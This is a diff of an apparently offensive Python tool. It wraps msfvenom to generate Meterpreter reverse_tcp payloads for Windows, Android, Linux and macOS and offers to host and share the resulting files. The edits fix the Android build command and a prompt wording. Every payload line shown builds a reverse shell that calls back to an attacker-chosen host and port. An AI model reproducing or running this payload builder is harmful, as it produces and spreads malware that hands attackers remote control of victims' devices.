@@ -27,7 +27,7 @@ def payload_inpt():
 def payload_win():
 	os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost='+ip+' lport='+portno+' -f exe -o ~/Desktop/'+pname+'.exe')
 def payload_and():
-	os.system('msfvenom -p android/meterpreter/reverse_tcp lhost='+ip+' lport='+portno+' R exe -o ~/Desktop/'+pname+'.apk')	
+	os.system('msfvenom -p android/meterpreter/reverse_tcp lhost='+ip+' lport='+portno+' R -o ~/Desktop/'+pname+'.apk')	
 def payload_lnx():
 	os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp lhost='+ip+' lport='+portno+' -f elf -o ~/Desktop/'+pname+'.elf')
 def payload_mac():
@@ -52,7 +52,7 @@ def lsnr_mac():
 	os.system(cmnd)
 #-----------------------------------------------------
 def fileio():
-	yn = input(color.GREEN+color.BOLD+"Do you want to host/upload this upload to share it further? (y/n)\n"+color.END)	
+	yn = input(color.GREEN+color.BOLD+"Do you want to host/upload this payload to share it further? (y/n)\n"+color.END)	
 	if yn == 'y' or yn == 'Y' or yn == 'yes' or yn == 'YES':
 		if payload == 1:
 			path = "/root/Desktop/"+pname+".exe"
